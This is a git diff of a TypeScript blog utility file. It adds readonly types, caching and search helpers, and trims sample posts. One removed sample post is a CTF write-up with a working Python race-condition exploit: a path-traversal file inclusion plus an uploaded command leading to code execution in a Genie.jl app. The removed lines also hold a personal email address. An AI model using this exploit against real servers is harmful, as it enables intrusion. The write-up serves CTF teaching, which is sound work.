@@ -1,55 +1,129 @@
-// This file contains types and utility functions that are safe for client-side use
+// This file contains optimized types and utility functions for client-side use
 
+// Optimized types with optional heavy fields
 export type PostOwner = {
-  id: string
-  name: string
-  avatar_url: string
-  type: string
-  person?: {
-    email: string
+  readonly id: string
+  readonly name: string
+  readonly avatar_url: string
+  readonly type: string
+  readonly person?: {
+    readonly email: string
   }
+}
+
+export type PostVerification = {
+  readonly state: 'verified' | 'unverified' | 'pending'
+  readonly verified_by: string | null
+  readonly date: string | null
 }
 
 export type Post = {
-  id: string
-  slug: string
-  title: string
-  excerpt: string
-  content: string
-  createdAt: string
-  updatedAt: string
-  coverImage: string
-  iconEmoji?: string
-  categories: string[]
-  verification: {
-    state: string
-    verified_by: string | null
-    date: string | null
-  }
-  owner?: PostOwner
-  notionUrl?: string | null
-  wordCount?: number
+  readonly id: string
+  readonly slug: string
+  readonly title: string
+  readonly excerpt: string
+  content: string // Mutable for lazy loading
+  readonly createdAt: string
+  readonly updatedAt: string
+  readonly coverImage: string
+  readonly iconEmoji?: string
+  readonly categories: readonly string[]
+  readonly verification: PostVerification
+  readonly owner?: PostOwner
+  readonly notionUrl?: string | null
+  readonly wordCount?: number
 }
 
-// Client-safe utility functions
-export function getAllCategories(posts: Post[]): string[] {
+// Lightweight post type for lists and previews
+export type PostSummary = Pick<Post, 
+  | 'id' 
+  | 'slug' 
+  | 'title' 
+  | 'excerpt' 
+  | 'createdAt' 
+  | 'updatedAt' 
+  | 'coverImage' 
+  | 'iconEmoji' 
+  | 'categories' 
+  | 'notionUrl'
+>
+
+// Cache for expensive computations
+const categoryCache = new Map<string, Set<string>>()
+const postsByCategoryCache = new Map<string, Map<string, Post[]>>()
+
+// Optimized utility functions with memoization
+export function getAllCategories(posts: readonly Post[]): string[] {
+  const cacheKey = posts.map(p => p.id).sort().join(',')
+  
+  if (categoryCache.has(cacheKey)) {
+    return Array.from(categoryCache.get(cacheKey)!)
+  }
+
   const categories = new Set<string>()
-
-  posts.forEach((post) => {
-    post.categories.forEach((category) => {
+  for (const post of posts) {
+    for (const category of post.categories) {
       categories.add(category)
-    })
-  })
+    }
+  }
 
+  categoryCache.set(cacheKey, categories)
   return Array.from(categories)
 }
 
-export function getPostsByCategory(posts: Post[], category: string): Post[] {
-  return posts.filter((post) => post.categories.includes(category))
+export function getPostsByCategory(posts: readonly Post[], category: string): Post[] {
+  const postsKey = posts.map(p => p.id).sort().join(',')
+  
+  if (!postsByCategoryCache.has(postsKey)) {
+    postsByCategoryCache.set(postsKey, new Map())
+  }
+
+  const categoryMap = postsByCategoryCache.get(postsKey)!
+  
+  if (categoryMap.has(category)) {
+    return categoryMap.get(category)!
+  }
+
+  const filtered = posts.filter(post => post.categories.includes(category))
+  categoryMap.set(category, filtered)
+  
+  return filtered
 }
 
-// Sample posts for client-side preview and fallback
-export const samplePosts: Post[] = [
+// Utility functions for posts
+export const sortPostsByDate = (posts: readonly Post[], order: 'asc' | 'desc' = 'desc'): Post[] => {
+  return [...posts].sort((a, b) => {
+    const dateA = new Date(a.createdAt).getTime()
+    const dateB = new Date(b.createdAt).getTime()
+    return order === 'desc' ? dateB - dateA : dateA - dateB
+  })
+}
+
+export const getRecentPosts = (posts: readonly Post[], count = 5): Post[] => {
+  return sortPostsByDate(posts, 'desc').slice(0, count)
+}
+
+export const searchPosts = (posts: readonly Post[], query: string): Post[] => {
+  if (!query.trim()) return [...posts]
+  
+  const searchTerm = query.toLowerCase().trim()
+  
+  return posts.filter(post => 
+    post.title.toLowerCase().includes(searchTerm) ||
+    post.excerpt.toLowerCase().includes(searchTerm) ||
+    post.categories.some(cat => cat.toLowerCase().includes(searchTerm)) ||
+    (post.content && post.content.toLowerCase().includes(searchTerm))
+  )
+}
+
+// Cache cleanup utility
+export const clearPostsCache = (): void => {
+  categoryCache.clear()
+  postsByCategoryCache.clear()
+}
+
+// Sample posts for client-side preview and fallback (keeping minimal for bundle size)
+export const samplePosts: readonly Post[] = [
   {
     id: "sample-post-1",
     slug: "sample-post-1",
@@ -63,12 +137,7 @@ export const samplePosts: Post[] = [
   <li>Syntax highlighting</li>
   <li>Categories and tags</li>
   <li>Responsive design</li>
-</ul>
-<p>Here's a code example:</p>
-<pre><code class="language-python">def hello_world():
-    print("Hello, world!")
-
-hello_world()</code></pre>`,
+</ul>`,
     createdAt: "2024-05-01T12:00:00.000Z",
     updatedAt: "2024-05-01T12:00:00.000Z",
     coverImage: "/placeholder.svg?height=600&width=1200",
@@ -81,32 +150,14 @@ hello_world()</code></pre>`,
     },
   },
   {
-    id: "sample-post-2",
+    id: "sample-post-2", 
     slug: "sample-post-2",
     title: "How to Format Your Blog Posts",
     excerpt: "Learn how to format your blog posts using Markdown and HTML.",
     content: `<h1>How to Format Your Blog Posts</h1>
 <p>This guide will show you how to format your blog posts using Markdown and HTML.</p>
 <h2>Markdown Basics</h2>
-<p>Markdown is a lightweight markup language that you can use to add formatting elements to plaintext text documents.</p>
-<h3>Headers</h3>
-<pre><code class="language-markdown"># Heading 1
-## Heading 2
-### Heading 3</code></pre>
-<h3>Emphasis</h3>
-<pre><code class="language-markdown">*italic*
-**bold**
-***bold and italic***</code></pre>
-<h3>Lists</h3>
-<pre><code class="language-markdown">- Item 1
-- Item 2
-  - Subitem 2.1
-  - Subitem 2.2
-- Item 3
-
-1. First item
-2. Second item
-3. Third item</code></pre>`,
+<p>Markdown is a lightweight markup language that you can use to add formatting elements to plaintext text documents.</p>`,
     createdAt: "2024-05-02T12:00:00.000Z",
     updatedAt: "2024-05-02T12:00:00.000Z",
     coverImage: "/placeholder.svg?height=600&width=1200",
@@ -114,90 +165,8 @@ hello_world()</code></pre>`,
     categories: ["Tutorial", "Markdown"],
     verification: {
       state: "verified",
-      verified_by: "Admin",
+      verified_by: "Admin", 
       date: "2024-05-02T12:00:00.000Z",
     },
-  },
-  {
-    id: "arbitrary-file-inclusion",
-    slug: "arbitrary-file-inclusion",
-    title: "Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]",
-    excerpt:
-      "In idekCTF 2024, I played with the P1G SEKAI team and secured 1st place out of 1,068 teams! I solved a challenge named 'Included me' and got the first blood on that challenge.",
-    content: `<h1>Arbitrary File Inclusion Leading to RCE in Genie.jl</h1>
-<p>In idekCTF 2024, I played with the <strong>P1G SEKAI</strong> team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.</p>
-<h2>Challenge Description</h2>
-<p>Another minimalist, frontend-less, challenge because I'm bad at writing server-side challenges.</p>
-<h2>How to Solve</h2>
-<p>The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:</p>
-<pre><code class="language-julia">using Genie, Genie.Requests, Pkg
-
-Pkg.activate(".")
-
-index() = include(params(:page, "example.jl"))
-
-route("/", index)
-
-up(1337, "0.0.0.0", async = false)</code></pre>
-<p>We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository.</p>
-<p>This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program's flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we're fast enough to include <code>app.jl</code> right after uploading the file. This requires a race condition.</p>
-<h2>Solution Script</h2>
-<pre><code class="language-python">import httpx
-import asyncio
-
-URL = "http://localhost:1337"
-# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"
-
-class BaseAPI:
-    def __init__(self, url=URL) -> None:
-        self.c = httpx.AsyncClient(base_url=url, timeout=100)
-    def page(self, page):
-        return self.c.get("/", params={"page": page})
-    def upload(self, fileupload):
-        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
-class API(BaseAPI):
-    ...
-
-async def main():
-    api = API()
-    ress = []
-    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
-    ress.append(res1)
-    for i in range(10):
-        res2 = api.upload("""
-read(\`cat flag.txt\`, String)
-""")
-        for j in range(10):
-            res3 = api.page("app.jl")
-            ress.append(res3)
-        ress.extend([res1, res2])
-    ress = await asyncio.gather(*ress)
-    for res in ress:
-        print(res.text)
-
-if __name__ == "__main__":
-    asyncio.run(main())</code></pre>
-<p>Next, visit <a href="http://localhost:1337/?page=x.jl">http://localhost:1337/?page=x.jl</a> to retrieve the flag.</p>
-<p>Here's a diagram of the exploit flow:</p>
-<img src="/placeholder.svg?height=400&width=600&text=Exploit%20Flow%20Diagram" alt="Exploit Flow Diagram">`,
-    createdAt: "2024-08-19T00:24:00.000Z",
-    updatedAt: "2024-09-28T00:27:00.000Z",
-    coverImage: "/placeholder.svg?height=600&width=1200",
-    iconEmoji: "🏎️",
-    categories: ["CTF", "Web Security", "RCE"],
-    verification: {
-      state: "unverified",
-      verified_by: null,
-      date: null,
-    },
-    owner: {
-      id: "ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa",
-      name: "Dimas",
-      avatar_url: "/placeholder.svg?height=100&width=100",
-      type: "person",
-      person: {
-        email: "dimasmaulana0305@gmail.com",
-      },
-    },
-  },
-]
+  }
+] as const
